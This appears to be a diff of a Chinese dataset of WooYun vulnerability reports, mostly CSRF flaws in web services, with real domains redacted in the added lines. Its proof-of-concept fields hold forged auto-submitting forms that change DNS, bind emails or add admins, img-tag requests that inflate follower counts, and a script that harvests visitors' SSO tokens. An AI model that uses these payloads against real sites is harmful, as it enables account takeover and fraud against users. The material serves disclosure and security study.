+**详情**: 发表主题和回帖的接口均存在问题/ajax/form.aspx?publishmentSystemID=1&action=addPost （回帖）/ajax/form.aspx?publishmentSystemID=1&action=postAllInOne （发表主题）直接发POC：1.回帖<meta http-equiv=Content-Type content="text/html;charset=utf-8"><form id="addPostForm" action="http://[IP已脱敏] method="post"><input id="forumID" name="forumID" type="hidden" value="2"><input id="thre
 
 **POC**: 回帖：{"onlineTotal":"1 \u5206\u949F","userImageUrl":"/sitefiles/bairong/icons/avatars/atavar_middle_38.jpg","creationDate":"2014-08-16","prestige":0,"title":"CSRF TEST!","editUrl":"/post.aspx?forumID=2&threadID=1&postID=1011&postType=","userUrl":"/user.aspx?publishmentSystemID=1&userName=zphchina","er
 
@@ -10159,7 +10159,7 @@
 
 **详情**: 商务CSRF更改域名dns服务器，在用户不知情的情况下恶意更改域名解析
 
-**POC**: 首先我们需要在商务中国，来进行测试，我们登录之后，我们任意找一处有修改权限的地方例如1、这里然后用burp截断又例如修改密码处，同样可以截断我们抓包发现，是POST型，且没有token验证机制，故我们可以构造csrf可以构造的提交页面（包括但不限于这几处）1、http://www.bizcn.com/domainbacthdeal2、http://www.bizcn.com/dnsresolve这里我们拿修改解析为例！首先我们按照抓包的内容，如图2 构造一个表单html页面1处填写域名 2 、3处写DNS地址OK  构造完成！以上是挖掘过程接下来是测试阶段，为了更好的演示效果，我们用另外一个小
+**POC**: 首先我们需要在商务中国，来进行测试，我们登录之后，我们任意找一处有修改权限的地方例如1、这里然后用burp截断又例如修改密码处，同样可以截断我们抓包发现，是POST型，且没有token验证机制，故我们可以构造csrf可以构造的提交页面（包括但不限于这几处）1、https://example.com/[已脱敏] 构造一个表单html页面1处填写域名 2 、3处写DNS地址OK  构造完成！以上是挖掘过程接下来是测试阶段，为了更好的演示效果，我们用另外一个小
 
 **绕过**: 直接利用
 
@@ -10167,7 +10167,7 @@
 ---
 
 ---
-### [wooyun-2014-060499] 百合-百度 OAuth 2.0 redirect_uri CSRF 漏洞
+### [wooyun-2014-060499] 百合-某搜索引擎 OAuth 2.0 redirect_uri CSRF 漏洞
 **厂商**: 百合网 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 认证接口
@@ -10179,7 +10179,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百合-百度 OAuth 2.0 认证流程中https://openapi.baidu.com/oauth/2.0/authorize?response_type=code&client_id=sSjGGXfnrH06sF7TbOVOuVRV&redirect_uri=http://open.baihe.com/connector/t/baiduInternalBindCallBack.action百合并没有提供有效方式抵抗针对redirect_uri 的CSRF 攻击。如果攻击者重新发起一个百合-百度  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。http://open.baihe.com/connector/t/baiduInternalBindCallBack.action?code=ae3197a3a5b36e219c5362f763aeaf39攻击者诱骗
+**详情**: 百合-某搜索引擎 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个百合-某搜索引擎  OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10189,8 +10189,8 @@
 ---
 
 ---
-### [wooyun-2014-058804] 腾讯微社区CSRF漏洞2枚（可以刷粉丝和人气）
-**厂商**: 腾讯 | **年份**: 2014 | **类型**: CSRF
+### [wooyun-2014-058804] 某互联网公司微社区CSRF漏洞2枚（可以刷粉丝和人气）
+**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -10201,7 +10201,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 第一个CSRF漏洞（刷粉丝）：利用CSRF构造好的URL：（其中key为指定社区的id）http://wsq.qq.com/reflow/follow?resType=json&isAjax=1&key=226216966中招CSRF后，会成功加入，可以用来刷成员刷人气刷粉丝、利用可以用<img src=http://wsq.qq.com/reflow/follow?resType=json&isAjax=1&key=226216966>之类的通过微博刷。。。第二个CSRF漏洞（刷人气）：利用URLhttp://mq.wsq.qq.com/226216966/like?tId=11&resType=json&isAjax=1&_=1398405189497返回成功数据{"errCode":0,"message":"\u5df2\u9876","data":{"likeNumber":2},
+**详情**: 第一个CSRF漏洞（刷粉丝）：利用CSRF构造好的URL：（其中key为指定社区的id）https://example.com/[已脱敏] src=https://example.com/[已脱敏]"errCode":0,"message":"\u5df2\u9876","data":{"likeNumber":2},
 
 **POC**: 如上
 
@@ -10211,7 +10211,7 @@
 ---
 
 ---
-### [wooyun-2013-034681] 天涯微博手机版CSRF刷粉丝
+### [wooyun-2013-034681] 天涯某社交平台手机版CSRF刷粉丝
 **厂商**: 天涯社区 | **年份**: 2013 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
@@ -10245,9 +10245,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://wooyun.org/bugs/wooyun-2013-036072众点评刷粉，Follow用户为GET方式，而且没有做CSRF防范，http://www.dianping.com/member/jsonp/followUser?memberId=xxxxxx这个哥们提交过了- - 当然被限制了，好蛋疼的说http://www.dianping.com/member/42915773/fans在这里抓包
+**详情**: https://example.com/[已脱敏] - 当然被限制了，好蛋疼的说https://example.com/[已脱敏]
 
-**POC**: http://www.dianping.com/member/jsonp/followUser?rand=965.1333225495003&memberId=1&callback=DP._JSONPRequest._4访问直接关注ID为1的用户附送一个洞洞。。http://m.dianping.com/在搜索哪里你输入<>不点搜索就直接输出- - 我表示程序猿工资一定很低http://wap.dianping.com/logout访问直接退出。。连同主站一起退厂商的爆破哪里处理的很好，赞一个。
+**POC**: https://example.com/[已脱敏] - 我表示程序猿工资一定很低https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10267,13 +10267,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 聚美优品的绑定微博登陆的请求为http://passport.jumei.com/i/extconnect?site_name=sina_weibo&redirect=http%3A%2F%2Fi.jumei.com%2Fi%2Faccount%2Fsync_share此请求并未做csrf防护，攻击者可以在第三方网页中伪造此请求新浪微博的授权有如下特点，如果当前登陆的微博曾经授权过聚美优品，那么就会自动绑定成功所以我们可以找一个新浪微博登陆的csrf漏洞，让用户自动登陆攻击者的微博（新浪有此类漏洞，这里就不详细写出）然后再让用户访问绑定请求，这样就完成了对攻击者微博的绑定。攻击者使用微博登陆就可以进入用户的聚美优品账号
+**详情**: 聚美优品的绑定某社交平台登陆的请求为https://example.com/[已脱敏]
 
-**POC**: 已录视频http://v.youku.com/v_show/id_XMTQxNzEzNjgxNg==.html密码：198625
+**POC**: 已录视频https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 增加csrf防护微博绑定强制使用微博用户名密码登陆
+**修复**: 增加csrf防护某社交平台绑定强制使用某社交平台用户名密码登陆
 ---
 
 ---
@@ -10299,8 +10299,8 @@
 ---
 
 ---
-### [wooyun-2013-017303] 我又是如何日刷千万新浪微博粉丝的
-**厂商**: 新浪微博 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2013-017303] 我又是如何日刷千万某社交平台某社交平台粉丝的
+**厂商**: 某社交平台某社交平台 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 参数注入
 
@@ -10311,7 +10311,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.好吧，有点标题党，但是确实是真实的事情！在说漏洞细节之前，先举报一张图撒，刷粉丝多挣钱啊：2.出问题的站点是：http://qing.weibo.com现在我的微博粉丝只有5个人哈！3.我随便找个人关注下，注意这个时候要抓包啊！POST请求如下：POST /blog/api/attentionpost.php HTTP/1.1rialog=A0012&uid=【粉丝id】&aid=【关注的对象id】&name=【可以不填】&is_follower=【可以不填】上述两个参数中最重要的是uid，就是粉丝的id号，默认是本次请求的账户id，aid是关注的对象，也就是需要刷粉丝的那位客观！4.为了演示漏洞效果，这次我不帮乌云刷粉丝了，而是把乌云账号刷成我的粉丝（一是想说明漏洞的真实性：我不会去控制乌云微博的对吧，二是提高乌云微博的出镜率，希望大家通过正常手段去关注乌云）。大家还记的乌云uid号
+**详情**: 1.好吧，有点标题党，但是确实是真实的事情！在说漏洞细节之前，先举报一张图撒，刷粉丝多挣钱啊：2.出问题的站点是：https://example.com/[已脱敏] /blog/api/attentionpost.php HTTP/1.1rialog=A0012&uid=【粉丝id】&aid=【关注的对象id】&name=【可以不填】&is_follower=【可以不填】上述两个参数中最重要的是uid，就是粉丝的id号，默认是本次请求的账户id，aid是关注的对象，也就是需要刷粉丝的那位客观！4.为了演示漏洞效果，这次我不帮乌云刷粉丝了，而是把乌云账号刷成我的粉丝（一是想说明漏洞的真实性：我不会去控制乌云某社交平台的对吧，二是提高乌云某社交平台的出镜率，希望大家通过正常手段去关注乌云）。大家还记的乌云uid号
 
 **POC**: 7.如果我将本次POST的请求发送给burpsuite的intruder模块，uid设置成10位数字去遍历，我会日刷千万粉丝么？
 
@@ -10321,8 +10321,8 @@
 ---
 
 ---
-### [wooyun-2012-012539] 新浪微博某处CSRF漏洞
-**厂商**: 新浪 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-012539] 某社交平台某社交平台某处CSRF漏洞
+**厂商**: 某社交平台 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -10335,7 +10335,7 @@
 
 **详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。
 
-**POC**: 漏洞地址：http://login.sina.com.cn/member/aj_service_content.php<html><body><form id="imlonghao" name="imlonghao" action="http://login.sina.com.cn/member/aj_service_content.php" method="post"><input type="text" name="product" value="weibo" /><input type="text" name="ac" value="send" /><input type="text" 
+**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="product" value="weibo" /><input type="text" name="ac" value="send" /><input type="text" 
 
 **绕过**: 直接利用
 
@@ -10344,7 +10344,7 @@
 
 ---
 ### [wooyun-2013-017487] DX2.5某处操作未验证HASH，可以CSRF快速刷分！
-**厂商**: 腾讯 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
+**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -10355,9 +10355,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 评分处未验证HASH，在个人签名或者回复内容中用插入图片功能插入评分链接，别人打开包含该图片的帖子就会自动给指定帖子加分了。[img]http://dzs.gamebbs.qq.com/forum.php?mod=misc&action=rate&ratesubmit=yes&infloat=yes&inajax=1formhash=3a0d2122&tid=111664&pid=1819715&referer=http%3A%2F%2Fdzs.gamebbs.qq.com%2Fforum.php%3Fmod%3Dviewthread%26tid%3D111664%26page%3D0%23pid1819715&handlekey=rate&score2=5&reason=%E6%94%AF%E6%8C%81%E5%8E%BB%E6%8E%89TP%EF%BC%81&ratesubmit=
+**详情**: 评分处未验证HASH，在个人签名或者回复内容中用插入图片功能插入评分链接，别人打开包含该图片的帖子就会自动给指定帖子加分了。[img]https://example.com/[已脱敏]
 
-**POC**: http://dzs.gamebbs.qq.com/forum.php?mod=viewthread&tid=111664&page=1#pid1819715
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10377,9 +10377,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 百度关键词inurl:wapindex.aspx柯林官方网站http://kelink.com/使用该cms的有八神智能网  八门神器的作者网站、wapzz 手机站长之家下面开始示例了。就用www.wapzz.cn做例子后面加上admin/addTopWAPALL.aspx?path=360库带计划&action=gomod&classid=0经过url编码得www.wapzz.cn/admin/addTopWAPALL.aspx?path=360%E5%BA%93%E5%B8%A6%E8%AE%A1%E5%88%92&action=gomod&classid=0管理员访问此链接，网站首页就会改为360库带计划。也可以直接使用简化链接www.wapzz.cn/admin/addTopWAPALL.aspx?path=360库带计划&action=gomod&classid=0再比如这个ht
+**详情**: 某搜索引擎关键词inurl:wapindex.aspx柯林官方网站https://example.com/[已脱敏]  八门神器的作者网站、wapzz 手机站长之家下面开始示例了。就用www.wapzz.cn做例子后面加上admin/addTopWAPALL.aspx?path=360库带计划&action=gomod&classid=0经过url编码得www.wapzz.cn/admin/addTopWAPALL.aspx?path=360%E5%BA%93%E5%B8%A6%E8%AE%A1%E5%88%92&action=gomod&classid=0管理员访问此链接，网站首页就会改为360库带计划。也可以直接使用简化链接www.wapzz.cn/admin/addTopWAPALL.aspx?path=360库带计划&action=gomod&classid=0再比如这个ht
 
-**POC**: 可构造链举例、http://www.jlwz.cn/wapindex.aspx?siteid=1000http://wap.03tw.com/wapindex.aspx?siteid=1000http://www.yllm.net/wapindex.aspx?siteid=1000http://mp4.aapig.cn/wapindex.aspxhttp://www.pctowap.com/air/51xtw.com/wapindex.aspx?siteid=1000
+**POC**: 可构造链举例、https://example.com/[已脱敏]
 
 **绕过**: 编码绕过
 
@@ -10399,9 +10399,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 删除文章url完全暴露给其他用户，都是这种形式：http://write.blog.csdn.net/postlist?t=del&id=这里就是文章的Id，所以完全可以伪造出删除文章的url；删除造作也没有加token,这样就形成了一个典型的CSRF漏洞。正常情况下，CSDN博主删除自己的文章，会弹出对话框确认是否删除，但是，如果我们删除文章的url，并伪装成一张图片来篇用户点击，那么，用户的文章就会在没有有任何对话框弹出的情况下被删掉。下面是CSRF攻击的整个过程（我用2个用户A, B模拟）1.首先看A用户发表了一篇文章：http://blog.csdn.net/u013546030/article/details/187057672.然后我用用户B的身份去访问这篇文章(注意这时并不能看见删除文章的链接):3.但是，我们可以“猜”出这个删除文章的URL:CSDN博客删除文章的链接一般形
+**详情**: 删除文章url完全暴露给其他用户，都是这种形式：https://example.com/[已脱敏] B模拟）1.首先看A用户发表了一篇文章：https://example.com/[已脱敏]):3.但是，我们可以“猜”出这个删除文章的URL:CSDN博客删除文章的链接一般形
 
-**POC**: 用户A点击用户B博客里的图片后，再去看这篇文章：http://blog.csdn.net/u013546030/article/details/18705767发现已经没有了：注：后面这里可以用img标签或者其他随便标签随便构造个get请求即可
+**POC**: 用户A点击用户B博客里的图片后，再去看这篇文章：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10445,7 +10445,7 @@
 
 **详情**: 收藏时候，POST如下请求：修改id=2：成功回执：
 
-**POC**: 利用上一个漏洞，可查看任意id的关注商品的URL：http://www.o2bra.com.cn/api/follows/my?user_id=2证明user_id=2确实关注：
+**POC**: 利用上一个漏洞，可查看任意id的关注商品的URL：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10465,7 +10465,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://login.360.cn/?o=sso&m=info&func=QiUserJsonP1380012848446&show_name_flag=1关注http://tao.360.cn/f_user_shop_api.html?shopid=2030&mod=del取消关注测试对象：
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 这里还有一发可以骗人的。至于被黑帽子利用后干嘛我们就不知道了。 自慰的，但是可以骗那些不懂得。 被黑帽子利用就不好啦。。当然360你们也在反社工对吧，这个完全可以说是可以用到社工，就好比我帮userB骗他刷一个XXX， 金币为：998988   当然他会把账号密码发来，之后拉黑他，想干嘛就干嘛，说不定他里面还有金币，拿去积分抽奖， 淫荡的思路又开始了。。。社会工程学强大，不解释 通用密码的我也不介意， 你们客户的安全隐患。。。 你自己懂~  很多人为了钱什么都做，你懂得。。。
 
@@ -10475,8 +10475,8 @@
 ---
 
 ---
-### [wooyun-2012-014880] 百度游戏CSRF,加加好友什么的不是梦
-**厂商**: 百度 | **年份**: 2012 | **类型**: CSRF
+### [wooyun-2012-014880] 某搜索引擎游戏CSRF,加加好友什么的不是梦
+**厂商**: 某搜索引擎 | **年份**: 2012 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -10497,8 +10497,8 @@
 ---
 
 ---
-### [wooyun-2010-0965] 腾讯微博有个一键转发的发帖的csrf漏洞
-**厂商**: 腾讯 | **年份**: 2010 | **类型**: CSRF
+### [wooyun-2010-0965] 某互联网公司某社交平台有个一键转发的发帖的csrf漏洞
+**厂商**: 某互联网公司 | **年份**: 2010 | **类型**: CSRF
 
 **元思考**: 触发信号: 功能测试
 
@@ -10531,7 +10531,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 暗恋：http://huodong.renren.com/biaobai/addBiaoBai?content=表白内容&beiId=表白对象ID号&beiName=表白对象名&userType=0http://huodong.renren.com/biaobai/addPublic?beiId=表白对象ID发状态：http://huodong.renren.com/biaobai/addDoing?c=表白内容&type=2通过发状态可蠕虫似地传播网址
+**详情**: 暗恋：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10555,7 +10555,7 @@
 
 **详情**: 
 
-**POC**: 首先我们先让用户中招绑定上我的QQ邮箱，我写了一个SCRF。代码如下：<html><head><title>scr poc</title></head><body><form action="http://i.beibei.com/security/email_binding.html" method="post"><input type="hidden" name="hxcsrf" value="47c1bdc32e559d7774e220a3c2427d43"><input type="hidden" name="email" value="953837476%40qq.com"></fo
+**POC**: 首先我们先让用户中招绑定上我的某互联网公司邮箱，我写了一个SCRF。代码如下：<html><head><title>scr poc</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="hxcsrf" value="47c1bdc32e559d7774e220a3c2427d43"><input type="hidden" name="email" value="953837476%40某互联网公司.com"></fo
 
 **绕过**: 直接利用
 
@@ -10575,13 +10575,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 问题1：账号注入后，绑定OAuth时，无token验证，存在csrf。而且此处应加入state参数。相关问题修复看http://drops.wooyun.org/papers/598 的 “针对应用方csrf劫持第三方账号” 章节。问题2：手机解除绑定操作可以被暴力破解，添加验证码解决。
+**详情**: 问题1：账号注入后，绑定OAuth时，无token验证，存在csrf。而且此处应加入state参数。相关问题修复看https://example.com/[已脱敏] 的 “针对应用方csrf劫持第三方账号” 章节。问题2：手机解除绑定操作可以被暴力破解，添加验证码解决。
 
 **POC**: 问题1证明：无token或者state保护，存在csrf。问题2证明：解绑定手机无验证码判断，存在暴力破解问题
 
 **绕过**: 直接利用
 
-**修复**: 漏洞1：相关问题修复看http://drops.wooyun.org/papers/598 的 “针对应用方csrf劫持第三方账号” 章节。具体修复参考漏洞2：添加提交code时的验证码检查功能
+**修复**: 漏洞1：相关问题修复看https://example.com/[已脱敏] 的 “针对应用方csrf劫持第三方账号” 章节。具体修复参考漏洞2：添加提交code时的验证码检查功能
 ---
 
 ---
@@ -10641,7 +10641,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 登录账户A，修改其收货地址，并抓包查看其收货地址，修改成功：请求为post，且参数可预测，尝试csrf。构造连接，主要代码;xmlhttp.open("POST", "http://www.benlai.com/UserHome/AddressOpt/.html", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("checkNeighbor=0&AddressCount=2&sysno=1898189&txtBrief=jia1&province=1&city=2&district=10&txtStreet=fgdsgtesghth&txtZip=100000&txtName=woo&
+**详情**: 登录账户A，修改其收货地址，并抓包查看其收货地址，修改成功：请求为post，且参数可预测，尝试csrf。构造连接，主要代码;xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("checkNeighbor=0&AddressCount=2&sysno=1898189&txtBrief=jia1&province=1&city=2&district=10&txtStreet=fgdsgtesghth&txtZip=100000&txtName=woo&
 
 **POC**: 同上
 
@@ -10663,7 +10663,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 酷6-开心 OAuth 2.0 认证流程中http://api.kaixin001.com/oauth2/authorize?response_type=code&client_id=832443644017752d378f4d7bc545c3c6&redirect_uri=http://passport.ku6.com/kaixin-userBindCallback.htm?redirect=http://my.ku6.com/my_account/accountbinding&scope=basic%20create_records酷6网并没有提供有效方式抵抗针对redirect_uir 的CSRF 攻击。如果攻击者重新发起一个酷6-开心OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。http://passport.ku6.com/kaixin-userBind
+**详情**: 酷6-开心 OAuth 2.0 认证流程中https://example.com/[已脱敏] 的CSRF 攻击。如果攻击者重新发起一个酷6-开心OAuth 2.0 认证请求，并截获OAuth 2.0 认证请求的返回。https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -10685,7 +10685,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1. 分析加关注请求，是POST请求2.用GET方式尝试下，发现用的是$_REQUEST GET方式同样可以请求，那么就可以找个位置CSRF了，理想的位置就是帖子页面。3. 帖子回复插入img src为http://i.autohome.com.cn/ajax/relations/addfollower?fuid=8001685 发现被处理了，然后插入表情图片 可以正常显示，慢慢琢磨，发现img src没有带图片后缀的会被过滤。4. 绕过图片src限制构造，加个a=a.gif http://i.autohome.com.cn/ajax/relations/addfollower?fuid=8001685&a=a.gif 达到同样的加粉效果。
+**详情**: 1. 分析加关注请求，是POST请求2.用GET方式尝试下，发现用的是$_REQUEST GET方式同样可以请求，那么就可以找个位置CSRF了，理想的位置就是帖子页面。3. 帖子回复插入img src为https://example.com/[已脱敏] 发现被处理了，然后插入表情图片 可以正常显示，慢慢琢磨，发现img src没有带图片后缀的会被过滤。4. 绕过图片src限制构造，加个a=a.gif https://example.com/[已脱敏] 达到同样的加粉效果。
 
 **POC**: 一个帖子带来的粉丝一晚上超过一百哈~
 
@@ -10707,13 +10707,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 不少互联网厂商都有存在这个问题,9月的时候有同学写过一篇日志详细描述了这个问题：http://blog.renren.com/GetEntry.do?id=869693728&owner=275231305
+**详情**: 不少互联网厂商都有存在这个问题,9月的时候有同学写过一篇日志详细描述了这个问题：https://example.com/[已脱敏]
 
-**POC**: 测试豆瓣的~ chrome下测试点了就中招了哦http://mckelv.in/article/the-story-of-rainbow-sugar.html
+**POC**: 测试豆瓣的~ chrome下测试点了就中招了哦https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 人人网 和 新浪微博的解决方案是检测被嵌套frame后跳转，但是看Google、Twitter、Facebook都是通过 [X-Frame-Options](https://blog.whitehatsec.com/x-frame-options/ ) 解决的。具体 Google
+**修复**: 人人网 和 某社交平台某社交平台的解决方案是检测被嵌套frame后跳转，但是看Google、Twitter、Facebook都是通过 [X-Frame-Options](https://example.com/[已脱敏] ) 解决的。具体 Google
 ---
 
 ---
@@ -10729,7 +10729,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://202.204.172.166admin123456
+**详情**: http://[IP已脱敏]admin123456
 
 **POC**: (见原文)
 
@@ -10751,9 +10751,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。演示地址：http://in.imlonghao.com/WooYun-XXXXX/ (用户名/密码：imlonghao)登录状态下访问，会自动发一条名为Hello World的微博，并会关注一个用户。
+**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。演示地址：https://example.com/[已脱敏] (用户名/密码：imlonghao)登录状态下访问，会自动发一条名为Hello World的某社交平台，并会关注一个用户。
 
-**POC**: 【加关注】漏洞地址：http://xianguo.com/beings/follow<html><body><form id="imlonghao" name="imlonghao" action="http://xianguo.com/beings/follow" method="post"><input type="text" name="beingsIds" value="1378148" /><input type="text" name="parentId" value="0" /><input type="text" name="ftype" value="0" /></form>
+**POC**: 【加关注】漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="beingsIds" value="1378148" /><input type="text" name="parentId" value="0" /><input type="text" name="ftype" value="0" /></form>
 
 **绕过**: 直接利用
 
@@ -10775,7 +10775,7 @@
 
 **详情**: PHPOK CSRF获取管理员权限
 
-**POC**: 测试环境（PHPOK）：添加用户：抓包抓到如下内容：POST /phpok/admin.php?c=admin&f=save HTTP/1.1Host: www.evil.comProxy-Connection: keep-aliveContent-Length: 67Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: http://www.evil.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WO
+**POC**: 测试环境（PHPOK）：添加用户：抓包抓到如下内容：POST /phpok/admin.php?c=admin&f=save HTTP/1.1Host: www.evil.comProxy-Connection: keep-aliveContent-Length: 67Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Origin: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 6.1; WO
 
 **绕过**: 直接利用
 
@@ -10805,8 +10805,8 @@
 ---
 
 ---
-### [wooyun-2014-085436] 百度某接口鉴权不严格可跨域获取用户彩票站登录凭据
-**厂商**: 百度 | **年份**: 2014 | **类型**: CSRF
+### [wooyun-2014-085436] 某搜索引擎某接口鉴权不严格可跨域获取用户彩票站登录凭据
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: CSRF
 
 **元思考**: 触发信号: 参数注入, 认证接口
 
@@ -10817,9 +10817,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 话说在百度首页有个百度乐彩的选项卡。点击刷余额，会发出一条如下的异步请求。然后，这个请求精简一下，那些看上去进行鉴权的参数都去掉。得到下面的网址。（这些参数也只是看上去好像用来鉴权，其实根本没用起来）http://www.baidu.com/home/xman/data/xcardget?id=10&get=user手动请求，得到下面的一堆信息：{"errNo": "0","id": "10","data": {"balance": "0元","prizeinfo": {"count": "0","url": "http://www.lecai.com/user/cooperator/baidu/card_login.php?referer=http%3A%2F%2Fwww.lecai.com%2Fuser%2Forder%2Fwin%2F%3FagentId%3D5881"},"toke
+**详情**: 话说在某搜索引擎首页有个某搜索引擎乐彩的选项卡。点击刷余额，会发出一条如下的异步请求。然后，这个请求精简一下，那些看上去进行鉴权的参数都去掉。得到下面的网址。（这些参数也只是看上去好像用来鉴权，其实根本没用起来）https://example.com/[已脱敏]"errNo": "0","id": "10","data": {"balance": "0元","prizeinfo": {"count": "0","url": "https://example.com/[已脱敏]"},"toke
 
-**POC**: 要证明吗？那就在自己网站上挂个JS代码吧。专业收集访客的单点登录地址。等我多收集一点再来证明吧。<script type="text/javascript">var url = 'http://www.baidu.com/home/xman/data/xcardget?id=10&get=user&callback=?';$.getJSON(url,function(json) {var bd_info = json.data.token.bd_info;var bd_bind = json.data.token.bd_bind;var bd_sign = json.data.token.bd
+**POC**: 要证明吗？那就在自己网站上挂个JS代码吧。专业收集访客的单点登录地址。等我多收集一点再来证明吧。<script type="text/javascript">var url = 'https://example.com/[已脱敏]';$.getJSON(url,function(json) {var bd_info = json.data.token.bd_info;var bd_bind = json.data.token.bd_bind;var bd_sign = json.data.token.bd
 
 **绕过**: 直接利用
 
@@ -10839,9 +10839,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 此问题和去年的华为商城的漏洞http://wooyun.org/bugs/wooyun-2010-040163出在一个地方，但是添加/修改安全邮箱的接口变了，原来的是http://www.vmall.com/member/account/sendEmail.json，这次是http://www.vmall.com/member/updateEmail.json，估计是更改接口时忘记更新安全问题了吧。。。而且这次直接是GET方式。。
+**详情**: 此问题和去年的华为商城的漏洞https://example.com/[已脱敏]
 
-**POC**: 原账户安全邮箱没有添加：直接GET方式请求：http://www.vmall.com/member/updateEmail.json?email=ckcidek@163.com去到邮箱中，已收到邮件，直接访问该链接，即可成功重置邮箱重置邮箱后，通过新邮箱即可找回密码，登录商城重置后的安全邮箱处：
+**POC**: 原账户安全邮箱没有添加：直接GET方式请求：https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -10861,9 +10861,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: URL跳转:go.hupu.com/u?url=CSRF:bbs回帖处  无token,无referer判断所以http://go.hupu.com/u?url=http://x.x.x.x/csrf.html 可能更有欺骗性
+**详情**: URL跳转:go.hupu.com/u?url=CSRF:bbs回帖处  无token,无referer判断所以https://example.com/[已脱敏] 可能更有欺骗性
 
-**POC**: <div id="bodyframe" style="VISIBILITY: hidden"><form id="fastform" name="FORM" class="j_atc_content left" method="post" action="http://bbs.hupu.com/post.php?" onsubmit="textConvert('fastform', 'atc_content')"><!--回复框--><div id="re" class="box"><div id="re_top"></div><div id="re_box"><div class="left
+**POC**: <div id="bodyframe" style="VISIBILITY: hidden"><form id="fastform" name="FORM" class="j_atc_content left" method="post" action="https://example.com/[已脱敏]" onsubmit="textConvert('fastform', 'atc_content')"><!--回复框--><div id="re" class="box"><div id="re_top"></div><div id="re_box"><div class="left
 
 **绕过**: 直接利用
 
@@ -10883,7 +10883,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: <!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><title>CSRF Hijack</title></head><body><form id="form_add_buy_btc" class="form-horizontal" method="post" action="https://s.huobi.com/?a=do_buy"><div class="control-group"><label class="control-label tx-red" for="zuijiamaijia">最佳买价：</label><div class="controls"><label id="zuijiamaijia" class="tx-red" onclick="$('#form_add_buy_btc #mairujia'
